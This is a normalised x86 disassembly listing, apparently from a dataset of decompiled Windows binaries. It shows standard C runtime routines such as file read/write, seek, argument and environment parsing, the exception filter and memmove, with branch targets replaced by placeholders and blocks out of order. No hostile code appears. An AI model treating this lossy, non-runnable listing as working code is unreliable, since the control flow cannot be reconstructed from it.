mov eax [ ebp + 0x10 ]
mov al [ eax ]
cmp al 0x1a
je r-xdata
or al 0x4
jmp r-xdata
mov eax [ ebx ]
lea esi [ eax + esi + 0x4 ]
mov al [ esi ]
test al 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov [ ecx ] al
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
add ecx eax
cmp eax ecx
mov [ ebp - 0x8 ] ecx
jae r-xdata
or al 0x2
mov [ esi ] al
dec ecx
cmp [ ebp + 0x10 ] ecx
jae r-xdata
mov [ edi ] al
inc edi
inc [ ebp + 0x10 ]
jmp r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
inc [ ebp + 0x10 ]
lea eax [ ebp - 0x1 ]
push 0x1
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
inc eax
cmp [ eax ] 0xa
jne r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ebp + 0x10 ] ecx
jb r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ edi ] 0xd
inc edi
mov [ ebp + 0x10 ] eax
jmp r-xdata
add [ ebp + 0x10 ] 0x2
jmp r-xdata
jmp r-xdata
mov [ edi ] 0xd
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x48
je r-xdata
mov [ edi ] 0xa
jmp r-xdata
cmp edi [ ebp + 0xc ]
jne r-xdata
mov al [ ebp - 0x1 ]
cmp al 0xa
je r-xdata
inc edi
push 0x1
push 0xffffffff
push [ ebp + 0x8 ]
call sub_408b3a
add esp 0xc
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
jne r-xdata
mov [ edi ] 0xd
mov ecx [ ebx ]
inc edi
mov [ ecx + esi + 0x5 ] al
jmp r-xdata
sub_408b3a
mov eax [ esp + 0x4 ]
push ebx
cmp eax [ rw-data ]
push esi
push edi
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
mov ecx eax
mov esi eax
sar ecx 0x5
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
shl esi 0x3
mov ecx [ edi ]
test [ ecx + esi + 0x4 ] 0x1
je r-xdata
push eax
call sub_40a172
cmp eax 0xffffffff
pop ecx
jne r-xdata
push [ esp + 0x18 ]
push 0x0
push [ esp + 0x1c ]
push eax
call [ SetFilePointer@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
or eax 0xffffffff
mov eax [ edi ]
and [ eax + esi + 0x4 ] 0xfd
lea eax [ eax + esi + 0x4 ]
mov eax ebx
jmp r-xdata
push eax
call sub_409f85
pop ecx
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_408bd4
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov esi [ edi + 0x10 ]
cmp [ edi + 0x4 ] ebx
mov [ ebp - 0xc ] esi
jge r-xdata
push 0x1
push ebx
push esi
call sub_408b3a
add esp 0xc
cmp eax ebx
mov [ ebp - 0x4 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
or eax 0xffffffff
jmp r-xdata
mov edx [ edi + 0xc ]
test dx 0x108
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
mov ebx eax
sub ebx ecx
test dl 0x3
mov [ ebp - 0x8 ] ebx
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test dl 0x80
jne r-xdata
mov edx esi
mov ebx esi
sar edx 0x5
and ebx 0x1f
mov edx [ edx * 4 + rw-data ]
test [ edx + ebx * 8 + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov [ rw-data ] 0x16
mov edx ecx
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
add eax ecx
mov edx [ edi + 0x4 ]
test edx edx
jne r-xdata
inc edx
jmp r-xdata
inc [ ebp - 0x8 ]
sub eax ecx
add eax edx
mov [ ebp + 0x8 ] eax
mov eax esi
sar eax 0x5
and esi 0x1f
lea ebx [ eax * 4 + rw-data ]
shl esi 0x3
mov eax [ ebx ]
test [ esi + eax + 0x4 ] 0x80
je r-xdata
and [ ebp - 0x8 ] edx
jmp r-xdata
cmp edx eax
jae r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x4 ] eax
push 0x2
push 0x0
push [ ebp - 0xc ]
call sub_408b3a
add esp 0xc
cmp eax [ ebp - 0x4 ]
jne r-xdata
push 0x0
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
call sub_408b3a
mov eax 0x200
add esp 0xc
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
test [ edi + 0xd ] 0x20
jmp r-xdata
cmp [ eax ] 0xa
jne r-xdata
inc [ ebp + 0x8 ]
test ch 0x4
je r-xdata
je r-xdata
inc eax
jmp r-xdata
inc [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ esi + eax + 0x4 ] 0x4
cmp eax ecx
jae r-xdata
sub_408d2c
push ebp
mov ebp esp
sub esp 0x414
mov ecx [ ebp + 0x8 ]
push ebx
cmp ecx [ rw-data ]
push esi
push edi
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
mov eax ecx
mov esi ecx
sar eax 0x5
and esi 0x1f
lea ebx [ eax * 4 + rw-data ]
shl esi 0x3
mov eax [ ebx ]
mov al [ eax + esi + 0x4 ]
test al 0x1
je r-xdata
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jne r-xdata
test al 0x20
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
add eax esi
test [ eax + 0x4 ] 0x80
je r-xdata
push 0x2
push edi
push ecx
call sub_408b3a
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0xc ]
push edi
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] edi
jbe r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x40
je r-xdata
lea eax [ ebp - 0x414 ]
mov eax [ ebp - 0x8 ]
cmp eax edi
jne r-xdata
mov [ rw-data ] 0x1c
mov [ rw-data ] edi
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x1a
je r-xdata
mov edi eax
lea eax [ ebp - 0x414 ]
sub edi eax
lea eax [ ebp - 0xc ]
push 0x0
push eax
lea eax [ ebp - 0x414 ]
push edi
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov cl [ ecx ]
cmp cl 0xa
jne r-xdata
sub eax [ ebp - 0x10 ]
jmp r-xdata
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
cmp eax edi
jl r-xdata
mov [ eax ] cl
inc eax
mov ecx eax
lea edx [ ebp - 0x414 ]
sub ecx edx
cmp ecx 0x400
jl r-xdata
inc [ ebp - 0x10 ]
mov [ eax ] 0xd
inc eax
push 0x5
pop eax
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor edi edi
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0xc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp + 0x8 ]
call sub_409f85
pop ecx
jmp r-xdata
mov [ rw-data ] 0x9
mov [ rw-data ] eax
jmp r-xdata
sub_408ed9
push ebp
mov ebp esp
push ebx
push [ ebp + 0x8 ]
call sub_40901a
test eax eax
pop ecx
je r-xdata
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
mov ebx [ eax + 0x8 ]
test ebx ebx
je r-xdata
cmp ebx 0x5
jne r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
push 0x1
pop eax
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ rw-data ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
pop ebx
pop ebp
retn
and [ eax + 0x8 ] 0x0
push ecx
call ebx
pop ecx
mov ecx [ rw-data ]
mov edx [ rw-data ]
add edx ecx
push esi
cmp ecx edx
jge r-xdata
mov eax [ eax ]
mov esi [ rw-data ]
cmp eax 0xc000008e
jne r-xdata
lea esi [ ecx + ecx * 2 ]
sub edx ecx
lea esi [ esi * 4 + rw-data ]
cmp eax 0xc0000090
jne r-xdata
mov [ rw-data ] 0x83
jmp r-xdata
and [ esi ] 0x0
add esi 0xc
dec edx
jne r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ rw-data ] 0x81
jmp r-xdata
push [ rw-data ]
push 0x8
call ebx
pop ecx
mov [ rw-data ] esi
pop ecx
pop esi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ rw-data ] 0x84
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ rw-data ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ rw-data ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ rw-data ] 0x86
jmp r-xdata
mov [ rw-data ] 0x8a
sub_40901a
mov edx [ esp + 0x4 ]
mov ecx [ rw-data ]
cmp [ rw-data ] edx
push esi
mov eax rw-data
je r-xdata
lea ecx [ ecx + ecx * 2 ]
pop esi
lea ecx [ ecx * 4 + rw-data ]
cmp eax ecx
jae r-xdata
lea esi [ ecx + ecx * 2 ]
lea esi [ esi * 4 + rw-data ]
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
jne r-xdata
retn
add eax 0xc
cmp eax esi
jae r-xdata
sub_40905d
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
mov al [ esi ]
cmp al 0x22
jne r-xdata
call sub_40af6d
cmp al 0x20
jbe r-xdata
mov al [ esi + 0x1 ]
inc esi
cmp al 0x22
je r-xdata
mov al [ esi ]
test al al
je r-xdata
inc esi
cmp [ esi ] 0x20
ja r-xdata
cmp [ esi ] 0x22
jne r-xdata
test al al
je r-xdata
mov eax esi
pop esi
retn
cmp al 0x20
jbe r-xdata
inc esi
jmp r-xdata
movzx eax al
push eax
call sub_40ab67
test eax eax
pop ecx
je r-xdata
inc esi
jmp r-xdata
sub_4090b5
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi [ rw-data ]
xor edi edi
call sub_40af6d
lea eax [ edi * 4 + 0x4 ]
push eax
call sub_4054cb
mov esi eax
pop ecx
cmp esi ebx
mov [ rw-data ] esi
jne r-xdata
cmp al 0x3d
je r-xdata
mov edi [ rw-data ]
cmp [ edi ] bl
je r-xdata
push 0x9
call sub_406534
pop ecx
push esi
call sub_405450
pop ecx
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
inc edi
push [ rw-data ]
call sub_405f9f
pop ecx
mov [ rw-data ] ebx
mov [ esi ] ebx
pop edi
pop esi
mov [ rw-data ] 0x1
pop ebx
retn
push ebp
mov al [ esi ]
cmp al bl
je r-xdata
add edi ebp
cmp [ edi ] bl
jne r-xdata
push ebp
call sub_4054cb
cmp eax ebx
pop ecx
mov [ esi ] eax
jne r-xdata
push edi
call sub_405450
mov ebp eax
pop ecx
inc ebp
cmp [ edi ] 0x3d
je r-xdata
pop ebp
push edi
push [ esi ]
call sub_405540
pop ecx
add esi 0x4
pop ecx
push 0x9
call sub_406534
pop ecx
sub_40916e
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi rw-data
push 0x104
push esi
push ebx
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
mov edi esi
cmp [ eax ] bl
je r-xdata
call sub_40af6d
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push edi
call sub_409207
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
lea eax [ eax + ecx * 4 ]
push eax
call sub_4054cb
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push edi
call sub_409207
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] esi
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
leave
retn
push 0x8
call sub_406534
pop ecx
sub_409207
push ebp
mov ebp esp
mov ecx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
push ebx
push esi
and [ ecx ] 0x0
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov [ eax ] 0x1
mov eax [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
inc [ ecx ]
test esi esi
je r-xdata
mov dl [ eax + 0x1 ]
inc eax
cmp dl 0x22
je r-xdata
mov dl [ eax ]
inc eax
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc [ ecx ]
test esi esi
je r-xdata
test dl dl
je r-xdata
cmp dl 0x20
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
and [ esi ] 0x0
inc esi
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
test dl dl
jne r-xdata
test dl dl
je r-xdata
inc eax
mov bl [ eax ]
mov [ esi ] bl
inc esi
and [ ebp + 0x18 ] 0x0
inc eax
jmp r-xdata
inc [ ecx ]
test esi esi
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
test esi esi
je r-xdata
dec eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
test edi edi
je r-xdata
mov dl [ eax ]
cmp dl 0x20
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc eax
and [ esi - 0x1 ] 0x0
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
inc [ eax ]
pop ebp
retn
and [ edi ] 0x0
inc eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
test edi edi
je r-xdata
mov edx [ ebp + 0x14 ]
inc [ edx ]
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
cmp [ eax ] 0x22
jne r-xdata
inc eax
inc ebx
jmp r-xdata
mov edx ebx
dec ebx
test edx edx
je r-xdata
test bl 0x1
jne r-xdata
cmp [ eax ] 0x5c
jne r-xdata
mov dl [ eax ]
test dl dl
je r-xdata
inc ebx
shr ebx 0x1
xor edi edi
cmp [ ebp + 0x18 ] edi
je r-xdata
test esi esi
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
inc [ ecx ]
dec ebx
jne r-xdata
mov [ esi ] 0x5c
inc esi
mov [ ebp + 0x8 ] edi
cmp [ eax + 0x1 ] 0x22
lea edx [ eax + 0x1 ]
jne r-xdata
inc [ ecx ]
jmp r-xdata
and [ esi ] 0x0
inc esi
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp dl 0x20
je r-xdata
test esi esi
je r-xdata
mov eax edx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
jmp r-xdata
test esi esi
je r-xdata
cmp dl 0x9
je r-xdata
mov edi [ ebp + 0xc ]
xor edx edx
cmp [ ebp + 0x18 ] edx
sete dl
mov [ ebp + 0x18 ] edx
mov [ ebp + 0x8 ] 0x1
xor ebx ebx
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
inc [ ecx ]
inc eax
inc [ ecx ]
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov [ esi ] dl
inc esi
inc eax
inc [ ecx ]
sub_4093bb
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push ebp
mov ebp [ GetEnvironmentStringsW@IAT ]
push esi
push edi
xor ebx ebx
xor esi esi
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
cmp eax 0x2
jne r-xdata
cmp esi ebx
jne r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
cmp edi ebx
jne r-xdata
cmp [ esi ] bx
mov eax esi
je r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
mov [ rw-data ] 0x2
jmp r-xdata
cmp [ edi ] bl
mov eax edi
je r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
sub eax esi
mov edi [ WideCharToMultiByte@IAT ]
sar eax 0x1
push ebx
push ebx
inc eax
push ebx
push ebx
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
sub eax edi
inc eax
mov ebp eax
push ebp
call sub_4054cb
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebp
call sub_4054cb
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push ebp
push edi
push esi
call sub_405720
add esp 0xc
xor esi esi
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne r-xdata
push edi
call [ FreeEnvironmentStringsA@IAT ]
mov eax esi
jmp r-xdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_405f9f
pop ecx
mov [ esp + 0x10 ] ebx
sub_4094ed
sub esp 0x44
push ebx
push ebp
push esi
push edi
push 0x100
call sub_4054cb
mov esi eax
pop ecx
test esi esi
jne r-xdata
mov [ rw-data ] esi
mov [ rw-data ] 0x20
lea eax [ esi + 0x100 ]
push 0x1b
call sub_406534
pop ecx
lea eax [ esp + 0x10 ]
push eax
call [ GetStartupInfoA@IAT ]
cmp [ esp + 0x42 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
or [ esi ] 0xffffffff
mov [ esi + 0x5 ] 0xa
mov eax [ rw-data ]
add esi 0x8
add eax 0x100
jmp r-xdata
xor ebx ebx
mov eax [ esp + 0x44 ]
test eax eax
je r-xdata
cmp esi eax
jae r-xdata
or [ esi + 0x4 ] 0x80
test ebx ebx
mov [ esi + 0x4 ] 0x81
jne r-xdata
mov esi [ eax ]
lea ebp [ eax + 0x4 ]
mov eax 0x800
cmp esi eax
lea ebx [ esi + ebp ]
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + ebx * 8 ] 0xffffffff
lea esi [ eax + ebx * 8 ]
jne r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x44
retn
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
cmp [ rw-data ] esi
jge r-xdata
mov esi eax
or [ esi + 0x4 ] 0x40
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor edi edi
test esi esi
jle r-xdata
mov edi rw-data
inc ebx
cmp ebx 0x3
jl r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
mov eax [ ebx ]
cmp eax 0xffffffff
je r-xdata
mov esi [ rw-data ]
add [ rw-data ] 0x20
mov [ edi ] eax
lea ecx [ eax + 0x100 ]
cmp eax 0x3
jne r-xdata
inc edi
inc ebp
add ebx 0x4
cmp edi esi
jl r-xdata
mov cl [ ebp ]
test cl 0x1
je r-xdata
add edi 0x4
cmp [ rw-data ] esi
jl r-xdata
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov ecx [ edi ]
add eax 0x8
add ecx 0x100
jmp r-xdata
or [ esi + 0x4 ] 0x8
jmp r-xdata
test cl 0x8
jne r-xdata
push 0x100
call sub_4054cb
test eax eax
pop ecx
je r-xdata
jmp r-xdata
cmp eax ecx
jae r-xdata
mov eax edi
mov ecx edi
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + ecx * 8 ]
mov ecx [ ebx ]
mov [ eax ] ecx
mov cl [ ebp ]
mov [ eax + 0x4 ] cl
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
sub_409698
push esi
inc ebx
xor dh [ eax ]
pop eax
inc ebx
xor [ eax ] dh
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push ebp
cld
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
push ebp
lea ebp [ ebx + 0x10 ]
push 0xffffffff
push ebx
call sub_40537e
add esp 0x8
pop ebp
mov eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebx - 0x4 ] eax
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
mov eax 0x1
jmp r-xdata
lea ecx [ esi + esi * 2 ]
cmp [ edi + ecx * 4 + 0x4 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
lea ecx [ esi + esi * 2 ]
mov esi [ edi + ecx * 4 ]
jmp r-xdata
push esi
push ebp
lea ebp [ ebx + 0x10 ]
call [ edi + ecx * 4 + 0x4 ]
pop ebp
pop esi
mov ebx [ ebp + 0xc ]
or eax eax
je r-xdata
cmp esi 0xffffffff
je r-xdata
js r-xdata
mov eax 0x0
jmp r-xdata
mov edi [ ebx + 0x8 ]
push ebx
call sub_40533c
add esp 0x4
lea ebp [ ebx + 0x10 ]
push esi
push ebx
call sub_40537e
add esp 0x8
lea ecx [ esi + esi * 2 ]
push 0x1
mov eax [ edi + ecx * 4 + 0x8 ]
call sub_405412
mov eax [ edi + ecx * 4 ]
mov [ ebx + 0xc ] eax
call [ edi + ecx * 4 + 0x8 ]
sub_409778
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
push 0xfc
call sub_4097b1
mov eax [ rw-data ]
pop ecx
test eax eax
je r-xdata
test eax eax
jne r-xdata
push 0xff
call sub_4097b1
pop ecx
call eax
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_4097b1
push ebp
mov ebp esp
sub esp 0x1a4
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax rw-data
push esi
mov esi ecx
shl esi 0x3
cmp edx [ esi + rw-data ]
jne r-xdata
add eax 0x8
inc ecx
cmp eax rw-data
jl r-xdata
pop esi
leave
retn
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
cmp edx [ eax ]
je r-xdata
lea eax [ ebp + 0x8 ]
lea esi [ esi + rw-data ]
push 0x0
push eax
push [ esi ]
call sub_405450
pop ecx
push eax
push [ esi ]
push 0xfffffff4
call [ GetStdHandle@IAT ]
push eax
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp edx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
lea eax [ ebp - 0x1a4 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1a4 ]
push edi
push eax
lea edi [ ebp - 0x1a4 ]
call sub_405450
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
lea eax [ ebp - 0x1a4 ]
push r--data
push eax
call sub_405540
pop ecx
pop ecx
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_405540
lea eax [ ebp - 0xa0 ]
push edi
push eax
call sub_405550
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_405550
push [ esi + rw-data ]
lea eax [ ebp - 0xa0 ]
push eax
call sub_405550
push 0x12010
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_40af89
add esp 0x2c
pop edi
jmp r-xdata
lea eax [ ebp - 0x1a4 ]
push eax
call sub_405450
mov edi eax
lea eax [ ebp - 0x1a4 ]
sub eax 0x3b
push 0x3
add edi eax
push r--data
push edi
call sub_40b020
add esp 0x10
sub_409904
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
xor eax eax
push eax
call sub_4099a0
test eax eax
pop ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
push esi
call [ rw-data ]
jmp r-xdata
jmp sub_406dcc
pop esi
retn 0x4
sub_4099c0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_409a20 ]
jmp [ ecx * 4 + jump_table_409a9c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_409b08 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_409b08 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
